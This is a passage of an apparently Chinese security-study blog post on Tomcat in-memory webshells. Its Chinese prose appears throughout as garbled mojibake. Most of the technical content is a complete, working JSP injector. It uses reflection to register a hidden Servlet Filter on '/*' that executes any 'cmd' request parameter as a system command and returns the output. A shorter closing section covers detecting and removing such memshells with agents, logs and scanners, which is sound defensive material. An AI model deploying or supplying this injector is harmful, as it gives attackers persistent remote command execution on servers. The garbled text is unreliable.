// è¿™æ ·æˆ‘ä»¬å°±è·å–åˆ°äº† context 
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
</code></pre><ol start="3"><li>å¦‚ä½•ä¿®æ”¹å¯¹åº”çš„å±æ€§</li></ol><p><code>addFilterDef</code> : æ·»åŠ ä¸€ä¸ªfilterDefåˆ°Context<br><code>addFilterMapBefore</code> : Â æ·»åŠ <code>filterMap</code>åˆ°æ‰€æœ‰<code>filteræœ€å‰é¢</code><br><code>ApplicationFilterConfig</code>: Â ä¸ºæŒ‡å®šçš„è¿‡æ»¤å™¨<code>æ„é€ ä¸€ä¸ªæ–°çš„ ApplicationFilterConfig</code></p><p>å…ˆéœ€è¦å®ä¾‹åŒ–ä¸€ä¸ª<code>FilterDefå¯¹è±¡</code>ï¼Œå¹¶å°†æ¶æ„æ„é€ çš„<code>æ¶æ„ç±»æ·»åŠ åˆ°filterDef</code>ä¸­</p><pre><code class="java">//å®šä¹‰ä¸€äº›åŸºç¡€å±æ€§ã€ç±»åã€filteråç­‰
filterDemo filter = new filterDemo();
FilterDef filterDef = new FilterDef();
//name = filterDemo
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);
//æ·»åŠ filterDef
standardContext.addFilterDef(filterDef);
</code></pre><p>ä¹‹åå®ä¾‹åŒ–ä¸€ä¸ªFilterMapå¯¹è±¡ï¼Œå¹¶å°†filterMapåˆ°æ‰€æœ‰filteræœ€å‰é¢</p><pre><code class="java">//åˆ›å»ºfilterMapï¼Œè®¾ç½®filterå’Œurlçš„æ˜ å°„å…³ç³»,å¯è®¾ç½®æˆå•ä¸€urlå¦‚/xyz ,ä¹Ÿå¯ä»¥æ‰€æœ‰é¡µé¢éƒ½        å¯è§¦å‘å¯è®¾ç½®ä¸º/*
FilterMap filterMap = new FilterMap();
// filterMap.addURLPattern(&quot;/*&quot;);
filterMap.addURLPattern(&quot;/xyz&quot;);
//name = filterDemo
filterMap.setFilterName(name);
filterMap.setDispatcher(DispatcherType.REQUEST.name());
//æ·»åŠ æˆ‘ä»¬çš„filterMapåˆ°æ‰€æœ‰filteræœ€å‰é¢
standardContext.addFilterMapBefore(filterMap);
</code></pre><p>æœ€åï¼ŒFilterConfigså­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨FilterConfigä¸­ä¸»è¦å­˜æ”¾FilterDefå’ŒFilterå¯¹è±¡ç­‰ä¿¡æ¯</p><p>å…ˆè·å–å½“å‰filterConfigsä¿¡æ¯</p><pre><code class="java">FieldÂ ConfigsÂ =Â standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
</code></pre><p>é€šè¿‡Javaåå°„æ¥è·å¾—æ„é€ å™¨ï¼ˆConstructorï¼‰å¯¹è±¡å¹¶è°ƒç”¨å…¶newInstance()æ–¹æ³•åˆ›å»ºåˆ›å»ºFilterConfig</p><pre><code class="java">ConstructorÂ constructorÂ =Â ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,Â FilterDef.class);
</code></pre><p>ç„¶åå°†æ¶æ„çš„filteråå’Œé…ç½®å¥½çš„filterConfigä¼ å…¥</p><pre><code>//nameÂ =Â filterDemo
</code></pre><p>è‡³æ­¤ï¼Œæˆ‘ä»¬çš„æ¶æ„filterå·²ç»å…¨éƒ¨è£…è½½å®Œæˆ</p><pre><code class="java">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;java.util.Map&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.deploy.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.deploy.FilterMap&quot; %&gt;
&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
&lt;%
    final String name = &quot;FilterAgent&quot;;
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
    if (filterConfigs.get(name) == null)&#123;
        Filter filter = new Filter() &#123;
            @Override
            public void init(FilterConfig filterConfig) throws ServletException &#123;
            &#125;
            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;
                HttpServletRequest req = (HttpServletRequest) servletRequest;

                if (req.getParameter(&quot;cmd&quot;) != null)&#123;
                    byte[] bytes = new byte[1024];
                    Process process = new ProcessBuilder(&quot;cmd&quot;,&quot;/c&quot;,req.getParameter(&quot;cmd&quot;)).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes,0,len));
                    process.destroy();
                    return;
                &#125;
                filterChain.doFilter(servletRequest,servletResponse);
            &#125;
            @Override
            public void destroy() &#123;
            &#125;
        &#125;;
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * å°†filterDefæ·»åŠ åˆ°filterDefsä¸­
         */
        standardContext.addFilterDef(filterDef);
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern(&quot;/*&quot;);
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
        filterConfigs.put(name,filterConfig);
        out.print(&quot;Inject Success !&quot;);
    &#125;
%&gt;
</code></pre><h1 id="Tomcatå†…å­˜é©¬çš„æ’é™¤ä¸æŸ¥æ€"><a href="#Tomcatå†…å­˜é©¬çš„æ’é™¤ä¸æŸ¥æ€" class="headerlink" title="Tomcatå†…å­˜é©¬çš„æ’é™¤ä¸æŸ¥æ€"></a>Tomcatå†…å­˜é©¬çš„æ’é™¤ä¸æŸ¥æ€</h1><p>åˆ©ç”¨Java AgentæŠ€æœ¯éå†æ‰€æœ‰å·²ç»åŠ è½½åˆ°å†…å­˜ä¸­çš„classï¼Œå…ˆåˆ¤æ–­æ˜¯å¦æ˜¯å†…å­˜é©¬ï¼Œæ˜¯åˆ™è¿›å…¥å†…å­˜æŸ¥æ€</p><pre><code class="java">public class Transformer implements ClassFileTransformer &#123;
    public byte[] transform(ClassLoader classLoader, String s, Class&lt;?&gt; aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException &#123;
    // è¯†åˆ«å†…å­˜é©¬
    if(isMemshell(aClass,bytes))&#123;
        // æŸ¥æ€å†…å­˜é©¬
        byte[] newClassByte = killMemshell(aClass,bytes);
        return newClassByte;
    &#125;else&#123;
        return bytes;
        &#125;
    &#125;
&#125;
</code></pre><ul><li>è®¿é—®æ—¶æŠ›å‡ºå¼‚å¸¸ï¼ˆæˆ–è€…è·³è¿‡è°ƒç”¨ï¼‰ä¸­æ–­æ­¤æ¬¡è°ƒç”¨</li><li>ä»ç³»ç»Ÿä¸­ç§»é™¤è¯¥å¯¹è±¡</li></ul><h2 id="æ’é™¤æ–¹æ³•"><a href="#æ’é™¤æ–¹æ³•" class="headerlink" title="æ’é™¤æ–¹æ³•"></a>æ’é™¤æ–¹æ³•</h2><ol><li>å¦‚æœæ˜¯jspæ³¨å…¥ï¼Œæ—¥å¿—ä¸­æ’æŸ¥å¯ä»¥jspçš„è®¿é—®è¯·æ±‚</li><li>å¦‚æœæ˜¯ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ’é™¤ä¸­é—´ä»¶çš„error.logï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘çš„æŠ¥é”™ï¼Œåˆ¤æ–­æ³¨å…¥æ—¶é—´å’Œæ–¹æ³•</li><li>æ ¹æ®ä¸šåŠ¡ä½¿ç”¨çš„ç»„ä»¶æ’æŸ¥æ˜¯å¦å¯èƒ½å­˜åœ¨javaä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠæ˜¯å¦å­˜åœ¨è¿‡webshellï¼Œæ’æŸ¥æ¡†æ¶æ¼æ´ï¼Œååºåˆ—åŒ–æ¼æ´</li><li>å¦‚æœæ˜¯servletæˆ–è€…springçš„controllerç±»å‹ï¼Œæ ¹æ®ä¸ŠæŠ¥çš„webshellçš„urlæŸ¥æ‰¾æ—¥å¿—ï¼Œæ ¹æ®urlæœ€æ—©è®¿é—®æ—¶é—´ç¡®å®šè¢«æ³¨å…¥æ—¶é—´</li><li>å¦‚æœæ˜¯filteræˆ–è€…listenerç±»å‹ï¼Œå¯èƒ½ä¼šæœ‰è¾ƒå¤šçš„404ä½†æ˜¯å¸¦æœ‰å‚æ•°çš„è¯·æ±‚ï¼Œæˆ–è€…å¤§é‡è¯·æ±‚ä¸åŒurlä½†å¸¦æœ‰ç›¸åŒçš„å‚æ•°ï¼Œæˆ–è€…é¡µé¢ä¸å­˜åœ¨ä½†è¿”å›200çš„</li></ol><h2 id="æŸ¥æ€æ–¹å¼"><a href="#æŸ¥æ€æ–¹å¼" class="headerlink" title="æŸ¥æ€æ–¹å¼"></a>æŸ¥æ€æ–¹å¼</h2><p>å¯ä»¥ä½¿ç”¨å“¥æ–¯æ‹‰ï¼Œå†°èï¼Œæˆ–è€…ä¸Šæ–‡æåˆ°çš„å†…å­˜é©¬è¿›è¡Œä¸€ä¸ªç”Ÿæˆï¼Œç„¶åå†è¿›è¡ŒæŸ¥æ€ã€‚</p><ol><li><p>VisualVMï¼ˆè¿œç¨‹è°ƒè¯•ï¼‰<br>VisualVMæ˜¯ä¸€ä¸ªé›†æˆå¤šä¸ªJDKå‘½ä»¤è¡Œå·¥å…·çš„å¯è§†åŒ–å·¥å…·ã€‚å¯ä»¥ä½œä¸ºJavaåº”ç”¨ç¨‹åºæ€§èƒ½åˆ†æå’Œè¿è¡Œç›‘æ§çš„å·¥å…·ã€‚å¼€å‘äººå‘˜å¯ä»¥åˆ©ç”¨å®ƒæ¥ç›‘æ§ã€åˆ†æçº¿ç¨‹ä¿¡æ¯ï¼Œæµè§ˆå†…å­˜å †æ•°æ®ã€‚ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥åˆ©ç”¨å®ƒæ¥ç›‘æµ‹ã€æ§åˆ¶Javaåº”ç”¨ç¨‹åºæ¨ªè·¨æ•´ä¸ªç½‘ç»œçš„æƒ…å†µã€‚</p></li><li><p>arthas<br>arthasæ˜¯Alibabaå¼€æºçš„Javaè¯Šæ–­å·¥å…· <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvYXJ0aGFz">https://github.com/alibaba/arthas</span> æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½ç”¨çš„javaåº”ç”¨æ£€æµ‹å·¥å…·ï¼Œäº†è§£æ–‡æ¡£å¯ä»¥ä»è¿™é‡Œ<span class="exturl" data-url="aHR0cHM6Ly9hcnRoYXMuYWxpeXVuLmNvbS96aC1jbi8=">https://arthas.aliyun.com/zh-cn/</span><br>mbean(æŸ¥çœ‹ Mbean çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹å¼‚å¸¸Filter&#x2F;ServletèŠ‚ç‚¹)</p></li><li><p>Copagent<br>è¿™ä¸ªé¡¹ç›®æ˜¯ä¸Šé¢çš„æ”¹è¿›ç‰ˆæœ¬ï¼Œç›´æ¥å¯ä»¥ç¡®å®šé£é™©ç­‰çº§ï¼Œå¹¶ä¸”å°†å†…å­˜ä¸­çš„ä¿¡æ¯å…¨éƒ¨è¾“å‡ºã€‚<br>é¡¹ç›®åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L2NvcGFnZW50">https://github.com/LandGrey/copagent</span><br>è¯•äº†ä¸€ä¸‹ï¼Œåªæœ‰jdk1.8èƒ½å¤Ÿè¿è¡Œï¼Œä¹‹åä¼šç”Ÿæˆä¸€ä¸ª.copagentï¼Œé‡Œé¢æœ‰æ‰«æç»“æœã€‚</p></li><li><p>java-memshell-scanner<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2MwbnkxL2phdmEtbWVtc2hlbGwtc2Nhbm5lcg==">https://github.com/c0ny1/java-memshell-scanner</span><br>é€šè¿‡jspè„šæœ¬æ‰«æå¹¶æŸ¥æ€å„ç±»ä¸­é—´ä»¶å†…å­˜é©¬ï¼Œæ¯”Java agentè¦æ¸©å’Œä¸€äº›ã€‚</p></li></ol><div class="tags"><a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="ic i-tag"></i> Javaä»£ç å®¡è®¡</a> <a href="/tags/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%AF%87/" rel="tag"><i class="ic i-tag"></i> Javaå®‰å…¨åŸºç¡€ç¯‡</a></div></div><footer><div class="meta"></div><div class="reward"><button><i class="ic i-heartbeat"></i> èµèµ</button><p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="ä½™æ˜Ÿé…’ å¾®ä¿¡æ”¯ä»˜"><p>å¾®ä¿¡æ”¯ä»˜</p></div><div><img data-src="/images/alipay.png" alt="ä½™æ˜Ÿé…’ æ”¯ä»˜å®"><p>æ”¯ä»˜å®</p></div><div><img data-src="/images/paypal.png" alt="ä½™æ˜Ÿé…’ è´å®"><p>è´å®</p></div></div></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>ä½™æ˜Ÿé…’ <i class="ic i-at"><em>@</em></i>ä½™æ˜Ÿé…’</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcatå†…å­˜é©¬">http://example.com/APT/ä»£ç å®¡è®¡/Javaä»£ç å®¡è®¡/å®¡è®¡åŸºç¡€/Tomcatå†…å­˜é©¬/</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/fastjson/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesng5oej20zk0m87d4.jpg" title="fastjson"><span class="type">ä¸Šä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> Javaæ¼æ´å®¡è®¡</span><h3>fastjson</h3></a></div><div class="item right"><a href="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexoj0moj20zk0m8kgu.jpg" title="shellcode"><span class="type">ä¸‹ä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> å…æ€å­¦ä¹ </span><h3>shellcode</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">phpå†…å­˜é©¬</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">æŸ¥æ€phpå†…å­˜é©¬</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">javaå†…å­˜é©¬</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">ç±»åŠ è½½è¿‡ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">åŒäº²å§”æ´¾æœºåˆ¶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">åˆ†ç±»</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">Filterå†…å­˜é©¬</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">3.1.</span> <span class="toc-text">Filterç”Ÿå‘½å‘¨æœŸ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter%E7%B1%BB"><span class="toc-number">3.2.</span> <span class="toc-text">Filterç±»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wrapper%E5%92%8CContext"><span class="toc-number">3.2.1.</span> <span class="toc-text">wrapperå’ŒContext</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%8E%92%E9%99%A4%E4%B8%8E%E6%9F%A5%E6%9D%80"><span class="toc-number">4.</span> <span class="toc-text">Tomcatå†…å­˜é©¬çš„æ’é™¤ä¸æŸ¥æ€</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">æ’é™¤æ–¹æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%9D%80%E6%96%B9%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">æŸ¥æ€æ–¹å¼</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« "><ul><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/" rel="bookmark" title="ideaåŸºç¡€ä½¿ç”¨">ideaåŸºç¡€ä½¿ç”¨</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" rel="bookmark" title="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/" rel="bookmark" title="ç±»åŠ¨æ€åŠ è½½">ç±»åŠ¨æ€åŠ è½½</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–">Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E5%8F%8D%E5%B0%84/" rel="bookmark" title="Javaåå°„">Javaåå°„</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" rel="bookmark" title="10. JaveEEæ ¸å¿ƒ">10. JaveEEæ ¸å¿ƒ</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="bookmark" title="1. javaç±»åŠ è½½æœºåˆ¶">1. javaç±»åŠ è½½æœºåˆ¶</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" rel="bookmark" title="3. sun.misc.Unsafe">3. sun.misc.Unsafe</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" rel="bookmark" title="4. javaæ–‡ä»¶ç³»ç»Ÿå®‰å…¨">4. javaæ–‡ä»¶ç³»ç»Ÿå®‰å…¨</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JDBC/" rel="bookmark" title="6. JDBC">6. JDBC</a></li><li class="active"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" rel="bookmark" title="Tomcatå†…å­˜é©¬">Tomcatå†…å­˜é©¬</a></li></ul></div><div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ä½™æ˜Ÿé…’" data-src="/images/avatar.jpg"><p class="name" itemprop="name">ä½™æ˜Ÿé…’</p><div class="description" itemprop="description">æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">253</span> <span class="name">æ–‡ç« </span></a></div><div class="item categories"><a href="/categories/"><span class="count">43</span> <span class="name">åˆ†ç±»</span></a></div><div class="item tags"><a href="/tags/"><span class="count">36</span> <span class="name">æ ‡ç­¾</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>å…³äº</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>æ–‡ç« </a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/fastjson/" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/shellcode/" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>éšæœºæ–‡ç« </h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/System/" title="åˆ†ç±»äº æ“ä½œç³»ç»Ÿ">æ“ä½œç³»ç»Ÿ</a> <i class="ic i-angle-right"></i> <a href="/categories/System/kali/" title="åˆ†ç±»äº kali">kali</a></div><span><a href="/System/kali/Kali%E5%9F%BA%E7%A1%80/" title="KaliåŸºç¡€">KaliåŸºç¡€</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº ç½‘ç»œåŸºç¡€">ç½‘ç»œåŸºç¡€</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/DHCP/" title="DHCP">DHCP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="åˆ†ç±»äº ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</a></div><span><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/" title="CC1åˆ†æ">CC1åˆ†æ</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Other/" title="åˆ†ç±»äº æ‚é¡¹">æ‚é¡¹</a></div><span><a href="/Other/%E5%A4%87%E5%BF%98%E5%BD%95/" title="å¤‡å¿˜å½•">å¤‡å¿˜å½•</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E5%B8%B8%E7%94%A8%E5%BA%93/" title="åˆ†ç±»äº å¸¸ç”¨åº“">å¸¸ç”¨åº“</a></div><span><a href="/Program/golang/%E5%B8%B8%E7%94%A8%E5%BA%93/os/" title="os">os</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/Other/011-%E5%8F%8D%E5%BC%B9shell/016-War%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shell/" title="æœªå‘½å">æœªå‘½å</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a 